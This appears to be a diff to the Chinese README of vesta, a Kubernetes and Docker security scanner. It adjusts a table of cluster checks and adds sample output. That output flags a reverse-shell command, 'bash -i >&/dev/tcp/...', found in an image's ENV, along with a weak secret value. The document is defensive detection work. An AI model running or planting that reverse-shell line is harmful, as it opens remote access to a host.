@@ -83,31 +83,31 @@ vesta同时也是一个灵活，方便的工具，能够在各种系统上运行
 > Kubernetes检查
 
 
-| Supported | Check Item                                               | Description                                 | Severity                  | Reference                                                                                             |
-|-----------|----------------------------------------------------------|---------------------------------------------|---------------------------|-------------------------------------------------------------------------------------------------------|
-| ✔         | PrivilegeAllowed                                         | 危险的特权模式                                     | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)           |
-| ✔         | Capabilities                                             | 危险capabilities被设置                           | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)           |
-| ✔         | PV and PVC                                               | PV 被挂载到敏感目录并且状态为active                      | critical/medium           | [Ref](https://github.com/kvesta/vesta/wiki/Volume-Mount-Checking-References)                          |
-| ✔         | RBAC                                                     | K8s 权限存在危险配置                                | high/medium/ low/warning  |                                                                                                       |
-| ✔         | Kubernetes-dashborad                                     | 检查 `-enable-skip-login`以及 dashborad的账户权限    | critical/high/ low        | [Ref](https://xz.aliyun.com/t/11316#toc-10)                                                           |
-| ✔         | Kernel version                                           | 当前内核版本存在逃逸漏洞                                | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Kernel-Version-References)                                 |
-| ✔         | Docker Server version  (k8s versions is less than v1.24) | Docker Server版本存在漏洞                         | critical/high/ medium/low |                                                                                                       |
-| ✔         | Kubernetes certification expiration                      | 证书到期时间小于30天                                 | medium                    |                                                                                                       |
-| ✔         | ConfigMap and Secret check                               | ConfigMap 或者 Secret是否存在弱密码                  | high/medium               |                                                                                                       |
-| ✔         | PodSecurityPolicy check (k8s version under the v1.25)    | PodSecurityPolicy过度容忍Pod不安全配置               | high/medium/low           | [Ref](https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/)   |
-| ✔         | Auto Mount ServiceAccount Token                          | Pod默认挂载了service token                       | critical/high/ medium/low | [Ref](https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/configure-service-account/)      |
-| ✔         | NoResourceLimits                                         | 没有限制资源的使用，例如CPU,Memory, 存储                  | low                       | [Ref](https://github.com/kvesta/vesta/wiki/Resource-limitation-Checking-References)            |
-| ✔         | Job and Cronjob                                          | Job或CronJob没有设置seccomp或seLinux安全策略          | low                       | [Ref](https://www.aquasec.com/cloud-native-academy/docker-container/docker-cis-benchmark/)            | 
-| ✔         | Envoy admin                                              | Envoy admin被配置以及监听`0.0.0.0`.                | high/medium               | [Ref](https://www.envoyproxy.io/docs/envoy/latest/start/quick-start/admin#admin)                      |
-| ✔         | Cilium version                                           | Cilium 存在漏洞版本                               | critical/high/ medium/low | [Ref](https://security.snyk.io/package/golang/github.com%2Fcilium%2Fcilium)                           |
-| ✔         | Istio configurations                                     | Istio 存在漏洞版本以及安全配置检查                        | critical/high/ medium/low | [Ref](https://istio.io/latest/news/security/)                                                         |
-| ✔         | Kubelet 10255/10250 and Kubectl proxy                    | 存在node打开了10250或者10255并且未授权或 Kubectl proxy开启 | high/medium/ low          |                                                                                                       |
-| ✔         | Etcd configuration                                       | Etcd 安全配置检查                                 | high/medium               |                                                                                                       |
-| ✔         | Sidecar configurations                                   | Sidecar 安全配置检查以及Env环境检查                     | critical/high/ medium/low |                                                                                                       |              
-| ✔         | Pod annotation                                           | Pod annotation 存在不安全配置                      | high/medium/ low/warning  | [Ref](https://github.com/kvesta/vesta/wiki/Annotation-Checking-References)                            |
-| ✔         | DaemonSet                                                | DaemonSet存在不安全配置                            | critical/high/ medium/low |                                                                                                       |
-| ✔         | Backdoor                                                 | 检查k8s中是否有后门                                 | critical/high             | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                                        |
-| ✔         | Lateral admin movement                                   | Pod被特意配置到Master节点中                          | medium/low                |                                                                                                       |
+| Supported | Check Item                                               | Description                                 | Severity                  | Reference                                                                                           |
+|-----------|----------------------------------------------------------|---------------------------------------------|---------------------------|-----------------------------------------------------------------------------------------------------|
+| ✔         | PrivilegeAllowed                                         | 危险的特权模式                                     | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)         |
+| ✔         | Capabilities                                             | 危险capabilities被设置                           | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)         |
+| ✔         | PV and PVC                                               | PV 被挂载到敏感目录并且状态为active                      | critical/medium           | [Ref](https://github.com/kvesta/vesta/wiki/Volume-Mount-Checking-References)                        |
+| ✔         | RBAC                                                     | K8s 权限存在危险配置                                | high/medium/ low/warning  |                                                                                                     |
+| ✔         | Kubernetes-dashborad                                     | 检查 `-enable-skip-login`以及 dashborad的账户权限    | critical/high/ low        | [Ref](https://xz.aliyun.com/t/11316#toc-10)                                                         |
+| ✔         | Kernel version                                           | 当前内核版本存在逃逸漏洞                                | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Kernel-Version-References)                               |
+| ✔         | Docker Server version  (k8s versions is less than v1.24) | Docker Server版本存在漏洞                         | critical/high/ medium/low |                                                                                                     |
+| ✔         | Kubernetes certification expiration                      | 证书到期时间小于30天                                 | medium                    |                                                                                                     |
+| ✔         | ConfigMap and Secret check                               | ConfigMap 或者 Secret是否存在弱密码                  | high/medium/low           | [Ref](https://github.com/kvesta/vesta/wiki/ConfigMap-and-Secret-Checking-References)                |
+| ✔         | PodSecurityPolicy check (k8s version under the v1.25)    | PodSecurityPolicy过度容忍Pod不安全配置               | high/medium/low           | [Ref](https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/) |
+| ✔         | Auto Mount ServiceAccount Token                          | Pod默认挂载了service token                       | critical/high/ medium/low | [Ref](https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/configure-service-account/)    |
+| ✔         | NoResourceLimits                                         | 没有限制资源的使用，例如CPU,Memory, 存储                  | low                       | [Ref](https://github.com/kvesta/vesta/wiki/Resource-limitation-Checking-References)                 |
+| ✔         | Job and Cronjob                                          | Job或CronJob没有设置seccomp或seLinux安全策略          | low                       | [Ref](https://www.aquasec.com/cloud-native-academy/docker-container/docker-cis-benchmark/)          | 
+| ✔         | Envoy admin                                              | Envoy admin被配置以及监听`0.0.0.0`.                | high/medium               | [Ref](https://www.envoyproxy.io/docs/envoy/latest/start/quick-start/admin#admin)                    |
+| ✔         | Cilium version                                           | Cilium 存在漏洞版本                               | critical/high/ medium/low | [Ref](https://security.snyk.io/package/golang/github.com%2Fcilium%2Fcilium)                         |
+| ✔         | Istio configurations                                     | Istio 存在漏洞版本以及安全配置检查                        | critical/high/ medium/low | [Ref](https://istio.io/latest/news/security/)                                                       |
+| ✔         | Kubelet 10255/10250 and Kubectl proxy                    | 存在node打开了10250或者10255并且未授权或 Kubectl proxy开启 | high/medium/ low          |                                                                                                     |
+| ✔         | Etcd configuration                                       | Etcd 安全配置检查                                 | high/medium               |                                                                                                     |
+| ✔         | Sidecar configurations                                   | Sidecar 安全配置检查以及Env环境检查                     | critical/high/ medium/low |                                                                                                     |              
+| ✔         | Pod annotation                                           | Pod annotation 存在不安全配置                      | high/medium/ low/warning  | [Ref](https://github.com/kvesta/vesta/wiki/Annotation-Checking-References)                          |
+| ✔         | DaemonSet                                                | DaemonSet存在不安全配置                            | critical/high/ medium/low |                                                                                                     |
+| ✔         | Backdoor                                                 | 检查k8s中是否有后门                                 | critical/high             | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                                      |
+| ✔         | Lateral admin movement                                   | Pod被特意配置到Master节点中                          | medium/low                |                                                                                                     |
 
 
 ## 编译并使用vesta
@@ -160,6 +160,21 @@ Detected 216 vulnerabilities
 |     |                    |                 |                  |       |          | detected.                                                        |
 +-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
 
+Docker Histories:
++----+---------------+----------------------------+-------+-------+--------+--------------------------------+
+| ID |     NAME      | CURRENT/VULNERABLE VERSION | CVEID | SCORE | LEVEL  |          DESCRIPTION           |
++----+---------------+----------------------------+-------+-------+--------+--------------------------------+
+|  1 | Image History | - / -                      | -     |   0.0 | high   | Confusion value found          |
+|    |               |                            |       |       |        | in ENV: 'command' with         |
+|    |               |                            |       |       |        | the plain text 'bash -i        |
+|    |               |                            |       |       |        | >&/dev/tcp/127.0.0.1/9999 0>&1 |
+|    |               |                            |       |       |        | '.                             |
++----+---------------+----------------------------+-------+-------+--------+--------------------------------+
+|  2 |               | - / -                      | -     |   0.0 | medium | Docker history has found the   |
+|    |               |                            |       |       |        | senstive environment with      |
+|    |               |                            |       |       |        | key 'SECRET_KEY' and value:    |
+|    |               |                            |       |       |        | 123456.                        |
++----+---------------+----------------------------+-------+-------+--------+--------------------------------+
 ```
 
 3. 使用vesta检查Docker的基线配置
